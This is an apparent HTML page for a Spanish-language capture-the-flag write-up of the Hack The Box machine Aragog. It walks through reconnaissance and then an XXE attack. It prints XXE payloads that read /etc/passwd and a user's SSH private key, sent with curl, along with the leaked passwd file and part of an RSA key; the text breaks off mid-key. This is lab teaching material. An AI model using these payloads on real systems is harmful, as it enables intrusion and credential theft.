@@ -1,0 +1,958 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Aragog - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Aragog en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Aragog">
+<meta property="og:url" content="http://localhost:4000/htb-aragog/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Aragog en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-aragog/aragog.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-09-20T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-aragog/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Aragog</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Inteligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Aragog">
+    <meta itemprop="description" content="Resolución de la máquina Aragog en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="September 20, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Aragog
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-09-20T00:00:00-05:00">September 20, 2021 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-aragog/banner-aragog.jpg" alt=""></p>
+
+<h2 id="aragog">Aragog</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.78.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.78
+PING 10.10.10.78 <span class="o">(</span>10.10.10.78<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.78: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>143 ms
+
+<span class="nt">---</span> 10.10.10.78 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 143.053/143.053/143.053/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.78 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-20 00:43 CDT
+Initiating SYN Stealth Scan at 00:43
+Scanning 10.10.10.78 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.10.78
+Discovered open port 21/tcp on 10.10.10.78
+Discovered open port 80/tcp on 10.10.10.78
+Completed SYN Stealth Scan at 00:44, 22.05s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.78
+Host is up, received user-set <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-09-20 00:43:45 CDT <span class="k">for </span>22s
+Not shown: 51923 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 13609 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>22.36 seconds
+           Raw packets sent: 108742 <span class="o">(</span>4.785MB<span class="o">)</span> | Rcvd: 57740 <span class="o">(</span>2.310MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.78
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 21,22,80
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p21</span>,22,80 10.10.10.78 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-20 00:45 CDT
+Nmap scan report <span class="k">for </span>10.10.10.78
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.16
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.38 seconds
+</code></pre></div></div>
+
+<p>Analizando los resultados obtenidos de <code class="language-plaintext highlighter-rouge">nmap</code>, vemos que podemos acceder al servicio FTP como el usuario <em>anonymous</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.78
+Connected to 10.10.10.78.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.78:k4miyo<span class="o">)</span>: anonymous
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">dir
+</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+<span class="nt">-r--r--r--</span>    1 ftp      ftp            86 Dec 21  2017 test.txt
+226 Directory send OK.
+ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Dec 21  2017 <span class="nb">.</span>
+drwxr-xr-x    2 ftp      ftp          4096 Dec 21  2017 ..
+<span class="nt">-r--r--r--</span>    1 ftp      ftp            86 Dec 21  2017 test.txt
+226 Directory send OK.
+ftp&gt;
+</code></pre></div></div>
+
+<p>Aquí vemos sólo el archivo <code class="language-plaintext highlighter-rouge">test.txt</code>, por lo que procedemos a descargarlo a nuestra máquina para ver su contenido:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; binary
+200 Switching to Binary mode.
+ftp&gt; get test.txt
+<span class="nb">local</span>: test.txt remote: test.txt
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>test.txt <span class="o">(</span>86 bytes<span class="o">)</span><span class="nb">.</span>
+226 Transfer complete.
+86 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>1.2061 MB/s<span class="o">)</span>
+ftp&gt;
+</code></pre></div></div>
+
+<p>Abrimos el archivo y vemos que no presente contenido interesando; sin embargo, tiene un formato de <code class="language-plaintext highlighter-rouge">xml</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>test.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: test.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ &lt;details&gt;
+   2   │     &lt;subnet_mask&gt;255.255.255.192&lt;/subnet_mask&gt;
+   3   │     &lt;<span class="nb">test</span><span class="o">&gt;</span>&lt;/test&gt;
+   4   │ &lt;/details&gt;
+</code></pre></div></div>
+
+<p>Tambíen vemos que se encuentra abierto el puerto 80, por lo que ya sabemos que debemos ver las tecnologías que usa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.78/
+http://10.10.10.78/ <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.78], Title[Apache2 Ubuntu Default Page: It works]
+</code></pre></div></div>
+
+<p>De acuerdo con el título de la página, vemos que se trata de la web default de Apache. También lo podemos corroborar accediendo vía web.</p>
+
+<p><img src="/assets/images/htb-aragog/aragog_web.png" alt=""></p>
+
+<p>A este punto, vamos a tratar de descubrir posibles recursos que se encuentre dentro del sitio web. Para este caso vamos a usar <code class="language-plaintext highlighter-rouge">nmap</code> para enumrar:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">--script</span> http-enum <span class="nt">-p80</span> 10.10.10.78
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-20 00:55 CDT
+Nmap scan report <span class="k">for </span>10.10.10.78
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.84 seconds
+</code></pre></div></div>
+
+<p>En este caso no nos trajo información, por lo que vamos con un diccionario más grandes y tirando de la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>968 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.78/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.78/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+</span></code></pre></div></div>
+
+<p>Despúes de un buen rato, no encontramos ningún directorio en el servidor. Así que ahora vamos a buscar que recursos, primeramente creandonos un archivo donde pongamos algunas extensiones de archivos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>extensiones.txt
+───────┬───────────────────────────────────────────────────────────────────────
+       │ File: extensiones.txt
+───────┼───────────────────────────────────────────────────────────────────────
+   1   │ txt
+   2   │ php
+   3   │ php3
+   4   │ php4
+   5   │ php5
+   6   │ xml
+   7   │ html
+</code></pre></div></div>
+
+<p>Y volvemos a utilizar <code class="language-plaintext highlighter-rouge">wfuzz</code> agregando nuestro nuevo archivo de extensiones:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>968 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-w</span> extensiones.txt http://10.10.10.78/FUZZ.FUZ2Z
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.78/FUZZ.FUZ2Z
+Total requests: 882240
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000054:   403        11 L     32 W       290 Ch      "php"                                                           
+000000056:   403        11 L     32 W       291 Ch      "html"                                                          
+000024082:   200        3 L      6 W        46 Ch       "hosts - php"                                                   
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 0
+Processed Requests: 26495
+Filtered Requests: 26492
+Requests/sec.: 0
+</span></code></pre></div></div>
+
+<p>Vemos que existe un recurso denomiando <strong>hosts.php</strong>, por lo que accedemos  y vemos lo siguiente:</p>
+
+<p><img src="/assets/images/htb-aragog/aragog_hosts.png" alt=""></p>
+
+<p>“<em>There are 4294967294 possible hosts for</em>”, dicha frase hace referencia a los hosts que se encuentran en una red con determinada máscara; por lo tanto encontramos relación con el archivo <strong>test.txt</strong> que encontramos por FTP.</p>
+
+<p>Ahora, analizando un poco, vemos que el archivo <strong>test.txt</strong> tiene un formato en XML; buscando un poco, vemos que existe una vulnerabilidad relacionada a XML denominada XXE (XML External Entity) que podríamos probar. Para hacerlo, vamos a hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">curl</code> en conjunto con el parámetro <code class="language-plaintext highlighter-rouge">-d</code> para que el sitio nos pueda leer un archivo, para este caso el <strong>test.txt</strong> y ver que nos arroja:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-d</span> @test.txt http://10.10.10.78/hosts.php
+
+There are 62 possible hosts <span class="k">for </span>255.255.255.192
+</code></pre></div></div>
+
+<p>Podemos corroborar que el sitio es vulnerable a ataques de tipo XXE; por lo tanto en vez de que el sitio nos lea el archivo <strong>test.txt</strong>, vamos a buscar una forma de poder ingresar a la máquina víctima. Si quieremos saber un poco más al respecto, podemos consultar la siguiente liga:</p>
+
+<p><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XML External Entity (XXE) Processing)</a></p>
+
+<p>Haciendo una pruebas, vemos que se crea una entidad llamada <code class="language-plaintext highlighter-rouge">xxe</code>, el cual lo sustituimos en el campo que es leido por el servidor, para este caso el campo <code class="language-plaintext highlighter-rouge">subnet_mask</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"ISO-8859-1"</span>?&gt;
+&lt;<span class="o">!</span>DOCTYPE foo
+  <span class="o">[</span>&lt;<span class="o">!</span>ELEMENT foo ANY <span class="o">&gt;</span>
+   &lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"expect://id"</span> <span class="o">&gt;]&gt;</span>
+&lt;details&gt;
+    &lt;subnet_mask&gt;&amp;xxe<span class="p">;</span>&lt;/subnet_mask&gt;
+    &lt;<span class="nb">test</span><span class="o">&gt;</span>&lt;/test&gt;
+&lt;/details&gt;
+</code></pre></div></div>
+
+<p>Lo ejecutamos y vemos que no obtenemos algún resultado. Esto puede ser porque al servidor no le gusta el wrapper <code class="language-plaintext highlighter-rouge">expect</code>, así que vamos a utilizar otro, como por ejemplo <code class="language-plaintext highlighter-rouge">file</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"ISO-8859-1"</span>?&gt;
+&lt;<span class="o">!</span>DOCTYPE foo
+  <span class="o">[</span>&lt;<span class="o">!</span>ELEMENT foo ANY <span class="o">&gt;</span>
+   &lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"file:///etc/passwd"</span> <span class="o">&gt;]&gt;</span>
+&lt;details&gt;
+    &lt;subnet_mask&gt;&amp;xxe<span class="p">;</span>&lt;/subnet_mask&gt;
+    &lt;<span class="nb">test</span><span class="o">&gt;</span>&lt;/test&gt;
+&lt;/details&gt;
+</code></pre></div></div>
+
+<p>Lo ejecutamos y podemos ser el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la máquina víctima; por lo que podemos visualizar contenido del sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-d</span> @test.txt http://10.10.10.78/hosts.php
+                                                                
+There are 4294967294 possible hosts <span class="k">for </span>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin       
+sys:x:3:3:sys:/dev:/usr/sbin/nologin             
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync                 
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin     
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin        
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                  
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                              
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                                             
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                                                             
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                                                                    
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                                                                 
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false                                                                                        
+_apt:x:105:65534::/nonexistent:/bin/false                                                                                        
+messagebus:x:106:110::/var/run/dbus:/bin/false         
+uuidd:x:107:111::/run/uuidd:/bin/false                                                                                           
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false                  
+whoopsie:x:109:117::/nonexistent:/bin/false                 
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false 
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false  
+saned:x:119:127::/var/lib/saned:/bin/false     
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
+cliff:x:1001:1001::/home/cliff:/bin/bash
+mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false
+</code></pre></div></div>
+
+<p>Aquí podemos ver los usuarios del sistema <em>florian</em> y <em>cliff</em>. Pensando un poco, tenemos usuarios del sistema, el puerto 22 abierto y podemos ver archivos de sistema; con eso vamos a tratar de obtener el archivo <code class="language-plaintext highlighter-rouge">id_rsa</code> de los usuarios para tratar de conectarnos a la máquina víctima por SSH sin proporcionar contraseña.</p>
+
+<h4 id="testtxt">test.txt</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"ISO-8859-1"</span>?&gt;
+  &lt;<span class="o">!</span>DOCTYPE foo
+    <span class="o">[</span>&lt;<span class="o">!</span>ELEMENT foo ANY <span class="o">&gt;</span>
+  &lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"file:///home/florian/.ssh/id_rsa"</span> <span class="o">&gt;]&gt;</span>
+  &lt;details&gt;
+      &lt;subnet_mask&gt;&amp;xxe<span class="p">;</span>&lt;/subnet_mask&gt;
+      &lt;<span class="nb">test</span><span class="o">&gt;</span>&lt;/test&gt;
+  &lt;/details&gt;
+</code></pre></div></div>
+
+<h4 id="ejecución">Ejecución</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-d</span> @test.txt http://10.10.10.78/hosts.php
+
+There are 4294967294 possible hosts <span class="k">for</span> <span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
++YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
+lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
+1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
+Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
+d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
+AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
+TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
+9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
+/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
+0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
